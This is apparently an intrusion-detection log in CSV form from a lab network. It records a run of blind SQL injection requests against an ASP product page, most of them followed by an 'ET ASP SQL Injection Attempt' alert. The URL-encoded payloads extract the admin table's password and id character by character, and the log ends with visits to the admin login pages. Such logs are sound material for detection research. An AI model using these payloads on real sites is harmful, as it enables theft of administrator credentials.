timestamp,msg,ip_src,src_port,ip_dst,dst_port
2019/03/24 15:35:51.194391,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),11,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2048%20and%2048 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56850,192.168.244.136,80
2019/03/24 15:35:51.194391 ,ET ASP SQL Injection Attempt,192.168.244.1,56850,192.168.244.136,80
2019/03/24 15:35:51.257561,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),12,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2051%20and%2051 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56851,192.168.244.136,80
2019/03/24 15:35:51.257561 ,ET ASP SQL Injection Attempt,192.168.244.1,56851,192.168.244.136,80
2019/03/24 15:35:51.321735,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),13,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2051%20and%2051 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56852,192.168.244.136,80
2019/03/24 15:35:51.321735 ,ET ASP SQL Injection Attempt,192.168.244.1,56852,192.168.244.136,80
2019/03/24 15:35:51.366530,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),9,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2049%20and%2049 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56853,192.168.244.136,80
2019/03/24 15:35:51.366530 ,ET ASP SQL Injection Attempt,192.168.244.1,56853,192.168.244.136,80
2019/03/24 15:35:51.413741,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),14,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2055%20and%2055 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56854,192.168.244.136,80
2019/03/24 15:35:51.413741 ,ET ASP SQL Injection Attempt,192.168.244.1,56854,192.168.244.136,80
2019/03/24 15:35:51.459777,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),15,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%20100%20and%20100 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56855,192.168.244.136,80
2019/03/24 15:35:51.459777 ,ET ASP SQL Injection Attempt,192.168.244.1,56855,192.168.244.136,80
2019/03/24 15:35:51.507495,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),10,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2097%20and%2097 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56856,192.168.244.136,80
2019/03/24 15:35:51.507495 ,ET ASP SQL Injection Attempt,192.168.244.1,56856,192.168.244.136,80
2019/03/24 15:35:51.555775,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),16,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2055%20and%2055 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56857,192.168.244.136,80
2019/03/24 15:35:51.555775 ,ET ASP SQL Injection Attempt,192.168.244.1,56857,192.168.244.136,80
2019/03/24 15:35:51.601209,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),12,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2052%20and%2052 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56858,192.168.244.136,80
2019/03/24 15:35:51.601209 ,ET ASP SQL Injection Attempt,192.168.244.1,56858,192.168.244.136,80
2019/03/24 15:35:51.648123,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),13,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2052%20and%2052 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56859,192.168.244.136,80
2019/03/24 15:35:51.648123 ,ET ASP SQL Injection Attempt,192.168.244.1,56859,192.168.244.136,80
2019/03/24 15:35:51.694651,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),9,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2050%20and%2050 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56860,192.168.244.136,80
2019/03/24 15:35:51.694651 ,ET ASP SQL Injection Attempt,192.168.244.1,56860,192.168.244.136,80
2019/03/24 15:35:51.741959,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),14,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2056%20and%2056 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56861,192.168.244.136,80
2019/03/24 15:35:51.741959 ,ET ASP SQL Injection Attempt,192.168.244.1,56861,192.168.244.136,80
2019/03/24 15:35:51.805169,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),15,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%20101%20and%20101 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56862,192.168.244.136,80
2019/03/24 15:35:51.805169 ,ET ASP SQL Injection Attempt,192.168.244.1,56862,192.168.244.136,80
2019/03/24 15:35:51.857963,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),10,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2098%20and%2098 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56863,192.168.244.136,80
2019/03/24 15:35:51.857963 ,ET ASP SQL Injection Attempt,192.168.244.1,56863,192.168.244.136,80
2019/03/24 15:35:51.913331,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),16,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2056%20and%2056 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56864,192.168.244.136,80
2019/03/24 15:35:51.913331 ,ET ASP SQL Injection Attempt,192.168.244.1,56864,192.168.244.136,80
2019/03/24 15:35:51.960179,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),12,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2053%20and%2053 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56865,192.168.244.136,80
2019/03/24 15:35:51.960179 ,ET ASP SQL Injection Attempt,192.168.244.1,56865,192.168.244.136,80
2019/03/24 15:35:52.023949,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),13,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2053%20and%2053 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56866,192.168.244.136,80
2019/03/24 15:35:52.023949 ,ET ASP SQL Injection Attempt,192.168.244.1,56866,192.168.244.136,80
2019/03/24 15:35:52.085188,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),14,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2057%20and%2057 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56867,192.168.244.136,80
2019/03/24 15:35:52.085188 ,ET ASP SQL Injection Attempt,192.168.244.1,56867,192.168.244.136,80
2019/03/24 15:35:52.147848,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),15,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%20102%20and%20102 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56868,192.168.244.136,80
2019/03/24 15:35:52.147848 ,ET ASP SQL Injection Attempt,192.168.244.1,56868,192.168.244.136,80
2019/03/24 15:35:52.210562,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),10,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2099%20and%2099 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56869,192.168.244.136,80
2019/03/24 15:35:52.210562 ,ET ASP SQL Injection Attempt,192.168.244.1,56869,192.168.244.136,80
2019/03/24 15:35:52.353980,"GET /productshow.asp?id=9%20And%20(Select%20Top%201%20len(cstr([id]))%20From%20(Select%20Top%201%20*%20From%20[admin]%20Where%201=1%20Order%20by%20[username])%20T%20Order%20by%20[username]%20desc)<=2 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56870,192.168.244.136,80
2019/03/24 15:35:52.429965,"GET /productshow.asp?id=9%20And%20(Select%20Top%201%20len(cstr([id]))%20From%20(Select%20Top%201%20*%20From%20[admin]%20Where%201=1%20Order%20by%20[username])%20T%20Order%20by%20[username]%20desc)=1 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56871,192.168.244.136,80
2019/03/24 15:35:52.546789,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(id),1,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%20130 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56872,192.168.244.136,80
2019/03/24 15:35:52.546789 ,ET ASP SQL Injection Attempt,192.168.244.1,56872,192.168.244.136,80
2019/03/24 15:35:52.717951,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(id),1,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2079 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56873,192.168.244.136,80
2019/03/24 15:35:52.717951 ,ET ASP SQL Injection Attempt,192.168.244.1,56873,192.168.244.136,80
2019/03/24 15:35:52.790328,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(id),1,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2054 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56874,192.168.244.136,80
2019/03/24 15:35:52.790328 ,ET ASP SQL Injection Attempt,192.168.244.1,56874,192.168.244.136,80
2019/03/24 15:35:52.852250,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(id),1,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2042 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56875,192.168.244.136,80
2019/03/24 15:35:52.852250 ,ET ASP SQL Injection Attempt,192.168.244.1,56875,192.168.244.136,80
2019/03/24 15:35:52.898809,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(id),1,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2043%20and%2047 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56876,192.168.244.136,80
2019/03/24 15:35:52.898809 ,ET ASP SQL Injection Attempt,192.168.244.1,56876,192.168.244.136,80
2019/03/24 15:35:52.945580,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(id),1,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2048%20and%2050 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56877,192.168.244.136,80
2019/03/24 15:35:52.945580 ,ET ASP SQL Injection Attempt,192.168.244.1,56877,192.168.244.136,80
2019/03/24 15:35:53.025001,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(id),1,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2048%20and%2048 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56878,192.168.244.136,80
2019/03/24 15:35:53.025001 ,ET ASP SQL Injection Attempt,192.168.244.1,56878,192.168.244.136,80
2019/03/24 15:35:53.071283,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(id),1,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2049%20and%2049 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56879,192.168.244.136,80
2019/03/24 15:35:53.071283 ,ET ASP SQL Injection Attempt,192.168.244.1,56879,192.168.244.136,80
2019/03/24 15:36:06.346655,"GET /admin/ HTTP/1.1
Host: 192.168.244.136
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: screenwidth=1920; screenheight=1080; ASPSESSIONIDSQRSCQCD=FCFHJMBCIFELJAFMMDADJDBI; ASPSESSIONIDQSSSAQDC=EKKBOPBCFPJFCMIEOFGAKOBO; ASPSESSIONIDQASCQSCA=NIAPCODCNILDCCNFFEODIIKK

",192.168.244.1,56881,192.168.244.136,80
2019/03/24 15:36:06.413884,"GET /admin/Admin_Index_Top.asp HTTP/1.1
Host: 192.168.244.136
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://192.168.244.136/admin/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: screenwidth=1920; screenheight=1080; ASPSESSIONIDSQRSCQCD=FCFHJMBCIFELJAFMMDADJDBI; ASPSESSIONIDQSSSAQDC=EKKBOPBCFPJFCMIEOFGAKOBO; ASPSESSIONIDQASCQSCA=NIAPCODCNILDCCNFFEODIIKK; ASPSESSIONIDCSTDTTBT=GGNPIJJDPHJGPJFGKCMMONGJ

",192.168.244.1,56881,192.168.244.136,80
2019/03/24 15:36:06.417032,"GET /admin/Admin_Index_Left.asp HTTP/1.1
Host: 192.168.244.136
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://192.168.244.136/admin/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: screenwidth=1920; screenheight=1080; ASPSESSIONIDSQRSCQCD=FCFHJMBCIFELJAFMMDADJDBI; ASPSESSIONIDQSSSAQDC=EKKBOPBCFPJFCMIEOFGAKOBO; ASPSESSIONIDQASCQSCA=NIAPCODCNILDCCNFFEODIIKK; ASPSESSIONIDCSTDTTBT=GGNPIJJDPHJGPJFGKCMMONGJ

",192.168.244.1,56882,192.168.244.136,80
2019/03/24 15:36:06.418103,"GET /admin/Admin_Index_Main.asp HTTP/1.1
Host: 192.168.244.136
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://192.168.244.136/admin/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: screenwidth=1920; screenheight=1080; ASPSESSIONIDSQRSCQCD=FCFHJMBCIFELJAFMMDADJDBI; ASPSESSIONIDQSSSAQDC=EKKBOPBCFPJFCMIEOFGAKOBO; ASPSESSIONIDQASCQSCA=NIAPCODCNILDCCNFFEODIIKK; ASPSESSIONIDCSTDTTBT=GGNPIJJDPHJGPJFGKCMMONGJ

",192.168.244.1,56883,192.168.244.136,80
2019/03/24 15:36:06.418257,"GET /admin/Admin_Index_Bottom.asp HTTP/1.1
Host: 192.168.244.136
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://192.168.244.136/admin/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: screenwidth=1920; screenheight=1080; ASPSESSIONIDSQRSCQCD=FCFHJMBCIFELJAFMMDADJDBI; ASPSESSIONIDQSSSAQDC=EKKBOPBCFPJFCMIEOFGAKOBO; ASPSESSIONIDQASCQSCA=NIAPCODCNILDCCNFFEODIIKK; ASPSESSIONIDCSTDTTBT=GGNPIJJDPHJGPJFGKCMMONGJ

",192.168.244.1,56884,192.168.244.136,80
2019/03/24 15:36:06.499697,"GET /admin/Login.Asp HTTP/1.1
Host: 192.168.244.136
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://192.168.244.136/admin/Admin_Index_Top.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: screenwidth=1920; screenheight=1080; ASPSESSIONIDSQRSCQCD=FCFHJMBCIFELJAFMMDADJDBI; ASPSESSIONIDQSSSAQDC=EKKBOPBCFPJFCMIEOFGAKOBO; ASPSESSIONIDQASCQSCA=NIAPCODCNILDCCNFFEODIIKK; ASPSESSIONIDCSTDTTBT=GGNPIJJDPHJGPJFGKCMMONGJ

",192.168.244.1,56881,192.168.244.136,80
